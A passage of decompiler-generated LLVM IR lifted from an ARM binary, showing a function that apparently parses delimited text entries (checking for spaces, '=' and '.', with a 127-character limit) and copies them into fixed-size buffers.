  %v3_9ea8 = sub i32 0, %v4_9ea0
  %v4_9ea8 = and i32 %v1_9ea8, %v3_9ea8
  %v5_9ea8 = icmp slt i32 %v4_9ea8, 0
  store i1 %v5_9ea8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ea8 = icmp slt i32 %v1_9ea8, 0
  store i1 %v6_9ea8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ea8 = icmp eq i32 %v1_9ea8, 0
  store i1 %v7_9ea8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9ea8, label %dec_label_pc_a080, label %dec_label_pc_9eb4

dec_label_pc_9eb4:                                ; preds = %dec_label_pc_9e80
  %v0_9eb4 = load i32, i32* @r8, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 12
  %v2_9eb4 = inttoptr i32 %v1_9eb4 to i32*
  %v3_9eb4 = load i32, i32* %v2_9eb4, align 4
  store i32 %v3_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = add i32 %v3_9eb4, -4
  %v2_9eb8 = icmp ugt i32 %v3_9eb4, 3
  store i1 %v2_9eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = sub i32 3, %v3_9eb4
  %v4_9eb8 = and i32 %v3_9eb8, %v3_9eb4
  %v5_9eb8 = icmp slt i32 %v4_9eb8, 0
  store i1 %v5_9eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_9eb8 = icmp slt i32 %v1_9eb8, 0
  store i1 %v6_9eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9eb8 = icmp eq i32 %v3_9eb4, 4
  store i1 %v7_9eb8, i1* %cpsr_z.global-to-local, align 1
  %v8_9ebc = icmp sgt i32 %v3_9eb4, 4
  br i1 %v8_9ebc, label %dec_label_pc_a080, label %dec_label_pc_9ec0

dec_label_pc_9ec0:                                ; preds = %dec_label_pc_9eb4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9ec8 = call i32 @function_12f90(i32 39, i32* null)
  %v0_9ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ecc, i32* @r1, align 4
  store i32 %v3_9ec8, i32* %r2.global-to-local, align 4
  %v0_9ed4 = load i32, i32* @r4, align 4
  store i32 %v0_9ed4, i32* %r0.global-to-local, align 4
  %v3_9ed8 = inttoptr i32 %v0_9ed4 to i8*
  %v4_9ed8 = call i32 @function_13cf0(i8* %v3_9ed8, i32 %v0_9ecc, i32 %v3_9ec8)
  store i32 %v4_9ed8, i32* %r0.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r5, align 4
  %v2_9ee0 = add i32 %v0_9ee0, %v4_9ed8
  store i32 %v2_9ee0, i32* @sl, align 4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v2_9ee8 = add i32 %v2_9ee0, %v2_94a0
  store i32 %v2_9ee8, i32* %r3.global-to-local, align 4
  %v1_9eec = load i32, i32* @r6, align 4
  %v2_9eec = add i32 %v1_9eec, %v2_9ee8
  %v3_9eec = inttoptr i32 %v2_9eec to i8*
  %v4_9eec = load i8, i8* %v3_9eec, align 1
  %v6_9eec = zext i8 %v4_9eec to i32
  store i32 %v6_9eec, i32* %r2.global-to-local, align 4
  %v2_9ef0 = icmp ugt i8 %v4_9eec, 31
  store i1 %v2_9ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ef0 = icmp ult i8 %v4_9eec, 32
  store i1 %v6_9ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_9ef0 = icmp eq i8 %v4_9eec, 32
  store i1 %v7_9ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ef0, label %bb226, label %bb227

bb226:                                            ; preds = %dec_label_pc_9ec0
  %v2_9ef4 = add i32 %v4_9ed8, 1
  store i32 %v2_9ef4, i32* %r0.global-to-local, align 4
  br label %bb227

bb227:                                            ; preds = %dec_label_pc_9ec0, %bb226
  %v2_9f04 = phi i32 [ %v4_9ed8, %dec_label_pc_9ec0 ], [ %v2_9ef4, %bb226 ]
  %v1_9ef8 = load i32, i32* %fp.global-to-local, align 4
  %v2_9ef8 = sub i32 %v1_9ef8, %v0_9ee0
  store i32 %v2_9ef8, i32* %r3.global-to-local, align 4
  %v2_9efc = sub i32 %v2_9ef8, %v2_9f04
  store i32 %v2_9efc, i32* @r7, align 4
  %v0_9f00 = load i32, i32* @r4, align 4
  %v2_9f00 = add i32 %v0_9f00, %v2_9f04
  store i32 %v2_9f00, i32* @r6, align 4
  br i1 %v7_9ef0, label %bb228, label %bb229

bb228:                                            ; preds = %bb227
  %v3_9f04 = add i32 %v2_9f04, %v0_9ee0
  store i32 %v3_9f04, i32* @sl, align 4
  br label %bb229

bb229:                                            ; preds = %bb227, %bb228
  store i32 %v2_9efc, i32* %r1.global-to-local, align 4
  store i32 %v2_9f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9f18 = call i32 @function_13a60(i32 %v2_9f00, i32 %v2_9efc, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_9f18, i32* %r0.global-to-local, align 4
  %v1_9f1c = add i32 %v4_9f18, 1
  %v2_9f1c = icmp eq i32 %v4_9f18, -1
  store i1 %v2_9f1c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f1c = sub i32 0, %v4_9f18
  %v4_9f1c = and i32 %v1_9f1c, %v3_9f1c
  %v5_9f1c = icmp slt i32 %v4_9f1c, 0
  store i1 %v5_9f1c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f1c = icmp slt i32 %v1_9f1c, 0
  store i1 %v6_9f1c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f1c = icmp eq i32 %v1_9f1c, 0
  store i1 %v7_9f1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9f18, i32* @r4, align 4
  br i1 %v7_9f1c, label %dec_label_pc_9fd4, label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %bb229
  store i32 %v2_8fd8, i32* %r2.global-to-local, align 4
  %v1_9f2c = add i32 %v4_9f18, -1
  %v2_9f2c = icmp ne i32 %v4_9f18, 0
  store i1 %v2_9f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f2c = sub i32 0, %v4_9f18
  %v4_9f2c = and i32 %v4_9f18, %v3_9f2c
  %v5_9f2c = icmp slt i32 %v4_9f2c, 0
  store i1 %v5_9f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f2c = icmp slt i32 %v1_9f2c, 0
  store i1 %v6_9f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f2c = icmp eq i32 %v4_9f18, 1
  store i1 %v7_9f2c, i1* %cpsr_z.global-to-local, align 1
  %v7_9f30 = icmp slt i32 %v4_9f18, 2
  br i1 %v7_9f30, label %bb231, label %bb230

bb230:                                            ; preds = %dec_label_pc_9f28
  %v9_9f30 = add i32 %v4_9f18, -2
  store i32 %v9_9f30, i32* @r4, align 4
  br label %bb231

bb231:                                            ; preds = %dec_label_pc_9f28, %bb230
  %v1_9f34 = load i32, i32* @sl, align 4
  %v2_9f34 = add i32 %v1_9f34, %v2_8fd8
  store i32 %v2_9f34, i32* @r5, align 4
  %v0_9f38 = load i32, i32* @r6, align 4
  store i32 %v0_9f38, i32* %r0.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r7, align 4
  store i32 %v0_9f3c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f48 = call i32 @function_13a60(i32 %v0_9f38, i32 %v0_9f3c, i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32 1)
  store i32 %v4_9f48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9f4c = icmp slt i32 %v4_9f48, 0
  store i1 %v1_9f4c, i1* %cpsr_n.global-to-local, align 1
  %v2_9f4c = icmp eq i32 %v4_9f48, 0
  store i1 %v2_9f4c, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v4_9f48, 1
  br i1 %tmp232, label %.dec_label_pc_9f6c_crit_edge, label %dec_label_pc_9f54

.dec_label_pc_9f6c_crit_edge:                     ; preds = %bb231
  %v1_9f74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f54:                                ; preds = %bb231
  %v0_9f54 = load i32, i32* @r6, align 4
  store i32 %v0_9f54, i32* %r0.global-to-local, align 4
  %v0_9f58 = load i32, i32* @r7, align 4
  store i32 %v0_9f58, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f64 = call i32 @function_13a60(i32 %v0_9f54, i32 %v0_9f58, i32 ptrtoint (i32* @global_var_1431c.96 to i32), i32 1)
  store i32 %v4_9f64, i32* %r0.global-to-local, align 4
  %v1_9f68 = add i32 %v4_9f64, -1
  store i32 %v1_9f68, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f6c:                                ; preds = %.dec_label_pc_9f6c_crit_edge, %dec_label_pc_9f54
  %v1_9f74 = phi i32 [ %v1_9f74.pre, %.dec_label_pc_9f6c_crit_edge ], [ %v1_9f68, %dec_label_pc_9f54 ]
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v1_9f7c = add i32 %v2_9f74, %v1_9f74
  store i32 %v1_9f7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9f8c = load i32, i32* @sl, align 4
  %v4_9f8c = add i32 %v3_9f8c, %v1_9f7c
  %v5_9f8c = inttoptr i32 %v4_9f8c to i8*
  store i8 0, i8* %v5_9f8c, align 1
  %storemerge5.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9fac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f6c, %dec_label_pc_9fa4
  %v0_9fac = phi i32 [ %v0_9f98, %dec_label_pc_9fa4 ], [ %v0_9fac.pre, %dec_label_pc_9f6c ]
  %storemerge5 = phi i32 [ %v1_9fc0, %dec_label_pc_9fa4 ], [ %storemerge5.pre, %dec_label_pc_9f6c ]
  store i32 %storemerge5, i32* %stack_var_-40, align 4
  store i32 %v0_9fac, i32* %r0.global-to-local, align 4
  %v1_9fb0 = inttoptr i32 %v0_9fac to i8*
  %v2_9fb0 = call i32 @function_1399c(i8* %v1_9fb0)
  store i32 %v2_9fb0, i32* %r0.global-to-local, align 4
  %v3_9fb8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9fb8, i32* %r4.global-to-local, align 4
  %v2_9fbc = sub i32 %v2_9fb0, %v3_9fb8
  %v3_9fbc = icmp uge i32 %v2_9fb0, %v3_9fb8
  store i1 %v3_9fbc, i1* %cpsr_c.global-to-local, align 1
  %v4_9fbc = xor i32 %v3_9fb8, %v2_9fb0
  %v5_9fbc = xor i32 %v2_9fbc, %v2_9fb0
  %v6_9fbc = and i32 %v5_9fbc, %v4_9fbc
  %v7_9fbc = icmp slt i32 %v6_9fbc, 0
  store i1 %v7_9fbc, i1* %cpsr_v.global-to-local, align 1
  %v8_9fbc = icmp slt i32 %v2_9fbc, 0
  store i1 %v8_9fbc, i1* %cpsr_n.global-to-local, align 1
  %v9_9fbc = icmp eq i32 %v2_9fb0, %v3_9fb8
  store i1 %v9_9fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_9fc0 = add i32 %v3_9fb8, 1
  store i32 %v1_9fc0, i32* %ip.global-to-local, align 4
  %v8_9fc4 = icmp sgt i32 %v2_9fb0, %v3_9fb8
  %v0_9f98 = load i32, i32* @r5, align 4
  %v2_9f98 = add i32 %v0_9f98, %v3_9fb8
  %v3_9f98 = inttoptr i32 %v2_9f98 to i8*
  %v4_9f98 = load i8, i8* %v3_9f98, align 1
  %v6_9f98 = zext i8 %v4_9f98 to i32
  store i32 %v6_9f98, i32* %r3.global-to-local, align 4
  %v2_9f9c = icmp ugt i8 %v4_9f98, 60
  store i1 %v2_9f9c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9f9c = icmp ult i8 %v4_9f98, 61
  store i1 %v6_9f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f9c = icmp eq i8 %v4_9f98, 61
  store i1 %v7_9f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9fc4, label %dec_label_pc_9f98, label %dec_label_pc_9fc8

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a044, %dec_label_pc_9fc8, %bb229
  %v0_9fd4 = load i32, i32* @sl, align 4
  store i32 %v0_9fd4, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_9fc8
  %v0_9fdc = load i32, i32* @r8, align 4
  %v1_9fdc = add i32 %v0_9fdc, 12
  %v2_9fdc = inttoptr i32 %v1_9fdc to i32*
  %v3_9fdc = load i32, i32* %v2_9fdc, align 4
  store i32 %v3_9fdc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9fe8 = icmp slt i32 %v3_9fdc, 0
  store i1 %v1_9fe8, i1* %cpsr_n.global-to-local, align 1
  %v2_9fe8 = icmp eq i32 %v3_9fdc, 0
  store i1 %v2_9fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp233 = icmp slt i32 %v3_9fdc, 1
  br i1 %tmp233, label %dec_label_pc_a044, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fdc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_a020
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a000 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a000, i32* %r3.global-to-local, align 4
  %v0_a004 = load i32, i32* @r8, align 4
  %v1_a004 = add i32 %v0_a004, 12
  %v2_a004 = inttoptr i32 %v1_a004 to i32*
  %v3_a004 = load i32, i32* %v2_a004, align 4
  %v1_a008 = add i32 %v3_a000, 1
  store i32 %v1_a008, i32* %ip.global-to-local, align 4
  %v2_a00c = sub i32 %v3_a004, %v1_a008
  %v3_a00c = icmp uge i32 %v3_a004, %v1_a008
  store i1 %v3_a00c, i1* %cpsr_c.global-to-local, align 1
  %v4_a00c = xor i32 %v3_a004, %v1_a008
  %v5_a00c = xor i32 %v2_a00c, %v3_a004
  %v6_a00c = and i32 %v5_a00c, %v4_a00c
  %v7_a00c = icmp slt i32 %v6_a00c, 0
  store i1 %v7_a00c, i1* %cpsr_v.global-to-local, align 1
  %v8_a00c = icmp slt i32 %v2_a00c, 0
  store i1 %v8_a00c, i1* %cpsr_n.global-to-local, align 1
  %v9_a00c = icmp eq i32 %v3_a004, %v1_a008
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v1_a008, i32* %r1.global-to-local, align 4
  store i32 %v1_a008, i32* %stack_var_-40, align 4
  %v7_a01c = icmp sgt i32 %v3_a004, %v1_a008
  %v0_a02c.pre = load i32, i32* @r5, align 4
  br i1 %v7_a01c, label %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, label %dec_label_pc_a044

dec_label_pc_9ffc.dec_label_pc_a020_crit_edge:    ; preds = %dec_label_pc_9ffc
  %v0_a030.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, %dec_label_pc_9ff4
  %v0_a030 = phi i32 [ %v0_a030.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ %v3_9fb8, %dec_label_pc_9ff4 ]
  %v0_a02c = phi i32 [ %v0_a02c.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ %v0_9f98, %dec_label_pc_9ff4 ]
  %v0_a020 = phi i32 [ %v1_a008, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ], [ 0, %dec_label_pc_9ff4 ]
  %v1_a020 = and i32 %v0_a020, 33554432
  %v2_a020 = icmp ne i32 %v1_a020, 0
  store i1 %v2_a020, i1* %cpsr_c.global-to-local, align 1
  %v3_a020 = mul i32 %v0_a020, 128
  %v1_a024 = add i32 %v3_a020, 1472
  %v0_a028 = load i32, i32* %sb.global-to-local, align 4
  %v2_a028 = add i32 %v1_a024, %v0_a028
  store i32 %v2_a028, i32* %r1.global-to-local, align 4
  store i32 %v0_a02c, i32* %r0.global-to-local, align 4
  store i32 %v0_a030, i32* %r2.global-to-local, align 4
  %v3_a034 = inttoptr i32 %v0_a02c to i8*
  %v4_a034 = call i32 @function_13e00(i8* %v3_a034, i32 %v2_a028, i32 %v0_a030)
  store i32 %v4_a034, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a038 = icmp slt i32 %v4_a034, 0
  store i1 %v1_a038, i1* %cpsr_n.global-to-local, align 1
  %v2_a038 = icmp eq i32 %v4_a034, 0
  store i1 %v2_a038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a038, label %dec_label_pc_9ffc, label %dec_label_pc_9fd4

dec_label_pc_a044:                                ; preds = %dec_label_pc_9ffc, %dec_label_pc_9fdc
  %v0_a044 = phi i32 [ %v0_9f98, %dec_label_pc_9fdc ], [ %v0_a02c.pre, %dec_label_pc_9ffc ]
  store i32 %v0_a044, i32* %r0.global-to-local, align 4
  %v1_a048 = inttoptr i32 %v0_a044 to i8*
  %v2_a048 = call i32 @function_1399c(i8* %v1_a048)
  store i32 %v2_a048, i32* %r0.global-to-local, align 4
  %v1_a04c = add i32 %v2_a048, -127
  %v2_a04c = icmp ugt i32 %v2_a048, 126
  store i1 %v2_a04c, i1* %cpsr_c.global-to-local, align 1
  %v3_a04c = sub i32 126, %v2_a048
  %v4_a04c = and i32 %v3_a04c, %v2_a048
  %v5_a04c = icmp slt i32 %v4_a04c, 0
  store i1 %v5_a04c, i1* %cpsr_v.global-to-local, align 1
  %v6_a04c = icmp slt i32 %v1_a04c, 0
  store i1 %v6_a04c, i1* %cpsr_n.global-to-local, align 1
  %v7_a04c = icmp eq i32 %v2_a048, 127
  store i1 %v7_a04c, i1* %cpsr_z.global-to-local, align 1
  %v8_a050 = icmp sgt i32 %v2_a048, 127
  br i1 %v8_a050, label %dec_label_pc_9fd4, label %dec_label_pc_a054

dec_label_pc_a054:                                ; preds = %dec_label_pc_a044
  %v0_a054 = load i32, i32* @r8, align 4
  %v1_a054 = add i32 %v0_a054, 12
  %v2_a054 = inttoptr i32 %v1_a054 to i32*
  %v3_a054 = load i32, i32* %v2_a054, align 4
  %v1_a058 = and i32 %v3_a054, 33554432
  %v2_a058 = icmp ne i32 %v1_a058, 0
  store i1 %v2_a058, i1* %cpsr_c.global-to-local, align 1
  %v3_a058 = mul i32 %v3_a054, 128
  %v1_a05c = add i32 %v3_a058, 1472
  %v0_a060 = load i32, i32* @r5, align 4
  store i32 %v0_a060, i32* %r1.global-to-local, align 4
  %v0_a064 = load i32, i32* %sb.global-to-local, align 4
  %v2_a064 = add i32 %v1_a05c, %v0_a064
  store i32 %v2_a064, i32* @r0, align 4
  %v2_a068 = inttoptr i32 %v2_a064 to i8*
  %v3_a068 = call i32 @function_139c4(i8* %v2_a068, i32 %v0_a060)
  store i32 %v3_a068, i32* %r0.global-to-local, align 4
  %v0_a06c = load i32, i32* @r8, align 4
  %v1_a06c = add i32 %v0_a06c, 12
  %v2_a06c = inttoptr i32 %v1_a06c to i32*
  %v3_a06c = load i32, i32* %v2_a06c, align 4
  %v0_a070 = load i32, i32* @sl, align 4
  store i32 %v0_a070, i32* @r5, align 4
  %v1_a074 = add i32 %v3_a06c, 1
  store i32 %v1_a074, i32* %r3.global-to-local, align 4
  store i32 %v1_a074, i32* %v2_a06c, align 4
  %v1_9e8c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_a080:                                ; preds = %dec_label_pc_9eb4, %dec_label_pc_9e80
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a088 = call i32 @function_12f90(i32 38, i32* null)
  %v0_a08c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a08c, i32* @r1, align 4
  store i32 %v3_a088, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a098 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_a08c, i32 %v3_a088)
  store i32 %v4_a098, i32* %r0.global-to-local, align 4
  %v1_a09c = add i32 %v4_a098, 1
  %v2_a09c = icmp eq i32 %v4_a098, -1
  store i1 %v2_a09c, i1* %cpsr_c.global-to-local, align 1
  %v3_a09c = sub i32 0, %v4_a098
  %v4_a09c = and i32 %v1_a09c, %v3_a09c
  %v5_a09c = icmp slt i32 %v4_a09c, 0
  store i1 %v5_a09c, i1* %cpsr_v.global-to-local, align 1
  %v6_a09c = icmp slt i32 %v1_a09c, 0
  store i1 %v6_a09c, i1* %cpsr_n.global-to-local, align 1
  %v7_a09c = icmp eq i32 %v1_a09c, 0
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a09c, label %dec_label_pc_a3d0, label %dec_label_pc_a0a4

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a080
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a0ac = call i32 @function_12f90(i32 38, i32* null)
  %v0_a0b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a0b0, i32* @r1, align 4
  store i32 %v3_a0ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a0bc = call i32 @function_13cf0(i8* %tmp200, i32 %v0_a0b0, i32 %v3_a0ac)
  store i32 %v4_a0bc, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_a0c8 = add i32 %v4_a0bc, %v2_94a0
  store i32 %v2_a0c8, i32* %r3.global-to-local, align 4
  %v1_a0cc = load i32, i32* @r6, align 4
  %v2_a0cc = add i32 %v1_a0cc, %v2_a0c8
  %v3_a0cc = inttoptr i32 %v2_a0cc to i8*
  %v4_a0cc = load i8, i8* %v3_a0cc, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a0d4 = icmp ugt i8 %v4_a0cc, 31
  store i1 %v2_a0d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a0d4 = icmp ult i8 %v4_a0cc, 32
  store i1 %v6_a0d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a0d4 = icmp eq i8 %v4_a0cc, 32
  store i1 %v7_a0d4, i1* %cpsr_z.global-to-local, align 1
  %v2_a0dc = zext i1 %v7_a0d4 to i32
  %v2_a0dc.v4_a0bc = add i32 %v2_a0dc, %v4_a0bc
  store i32 %v2_a0dc.v4_a0bc, i32* @r4, align 4
  %v2_a0e0 = add i32 %v2_a0dc.v4_a0bc, %v2_8fd8
  store i32 %v2_a0e0, i32* @r5, align 4
  store i32 %v2_a0e0, i32* %r0.global-to-local, align 4
  %v1_a0e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_a0e8 = sub i32 %v1_a0e8, %v2_a0dc.v4_a0bc
  store i32 %v2_a0e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_a0f4 = call i32 @function_13a60(i32 %v2_a0e0, i32 %v2_a0e8, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_a0f4, i32* %r0.global-to-local, align 4
  %v1_a0f8 = add i32 %v4_a0f4, 1
  %v2_a0f8 = icmp eq i32 %v4_a0f4, -1
  store i1 %v2_a0f8, i1* %cpsr_c.global-to-local, align 1
  %v3_a0f8 = sub i32 0, %v4_a0f4
  %v4_a0f8 = and i32 %v1_a0f8, %v3_a0f8
  %v5_a0f8 = icmp slt i32 %v4_a0f8, 0
  store i1 %v5_a0f8, i1* %cpsr_v.global-to-local, align 1
  %v6_a0f8 = icmp slt i32 %v1_a0f8, 0
  store i1 %v6_a0f8, i1* %cpsr_n.global-to-local, align 1
  %v7_a0f8 = icmp eq i32 %v1_a0f8, 0
  store i1 %v7_a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_a0f4, i32* %lr.global-to-local, align 4
  br i1 %v7_a0f8, label %dec_label_pc_a3d0, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0a4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_a10c = add i32 %v4_a0f4, -1
  %v2_a10c = icmp ne i32 %v4_a0f4, 0
  store i1 %v2_a10c, i1* %cpsr_c.global-to-local, align 1
  %v3_a10c = sub i32 0, %v4_a0f4
  %v4_a10c = and i32 %v4_a0f4, %v3_a10c
  %v5_a10c = icmp slt i32 %v4_a10c, 0
  store i1 %v5_a10c, i1* %cpsr_v.global-to-local, align 1
  %v6_a10c = icmp slt i32 %v1_a10c, 0
  store i1 %v6_a10c, i1* %cpsr_n.global-to-local, align 1
  %v7_a10c = icmp eq i32 %v4_a0f4, 1
  store i1 %v7_a10c, i1* %cpsr_z.global-to-local, align 1
  %v1_a110 = load i32, i32* @r4, align 4
  %v2_a110 = add i32 %v1_a110, %v2_94a0
  store i32 %v2_a110, i32* %ip.global-to-local, align 4
  %v7_a114 = icmp sgt i32 %v4_a0f4, 1
  br i1 %v7_a114, label %bb234, label %bb235

bb234:                                            ; preds = %dec_label_pc_a104
  %v9_a114 = add i32 %v4_a0f4, -2
  store i32 %v9_a114, i32* %lr.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %dec_label_pc_a104, %bb234
  %v3_a138 = phi i32 [ %v4_a0f4, %dec_label_pc_a104 ], [ %v9_a114, %bb234 ]
  %v1_a11c = add i32 %v3_a138, 1
  store i32 %v1_a11c, i32* %r6.global-to-local, align 4
  %v1_a120 = add i32 %v2_a110, -20773
  store i32 %v1_a120, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_a128 = load i32, i32* @r5, align 4
  store i32 %v0_a128, i32* %r0.global-to-local, align 4
  store i32 %v1_a11c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14320.98 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_a138 = add i32 %v3_a138, %v1_a120
  %v5_a138 = inttoptr i32 %v4_a138 to i8*
  store i8 0, i8* %v5_a138, align 1
  %v5_a13c = call i32 @function_13a60(i32 %v0_a128, i32 %v1_a11c, i32 ptrtoint ([5 x i8]* @global_var_14320.98 to i32), i32 4)
  store i32 %v5_a13c, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v5_a13c, -4
  %v2_a140 = icmp ugt i32 %v5_a13c, 3
  store i1 %v2_a140, i1* %cpsr_c.global-to-local, align 1
  %v3_a140 = sub i32 3, %v5_a13c
  %v4_a140 = and i32 %v3_a140, %v5_a13c
  %v5_a140 = icmp slt i32 %v4_a140, 0
  store i1 %v5_a140, i1* %cpsr_v.global-to-local, align 1
  %v6_a140 = icmp slt i32 %v1_a140, 0
  store i1 %v6_a140, i1* %cpsr_n.global-to-local, align 1
  %v7_a140 = icmp eq i32 %v5_a13c, 4
  store i1 %v7_a140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a140, label %dec_label_pc_a6b8, label %dec_label_pc_a148

dec_label_pc_a148:                                ; preds = %bb235
  store i32 %v2_8fd8, i32* %ip.global-to-local, align 4
  %v1_a14c = load i32, i32* @r4, align 4
  %v2_a14c = add i32 %v1_a14c, %v2_8fd8
  %v3_a14c = inttoptr i32 %v2_a14c to i8*
  %v4_a14c = load i8, i8* %v3_a14c, align 1
  %v6_a14c = zext i8 %v4_a14c to i32
  store i32 %v6_a14c, i32* %r3.global-to-local, align 4
  %v2_a150 = icmp ugt i8 %v4_a14c, 46
  store i1 %v2_a150, i1* %cpsr_c.global-to-local, align 1
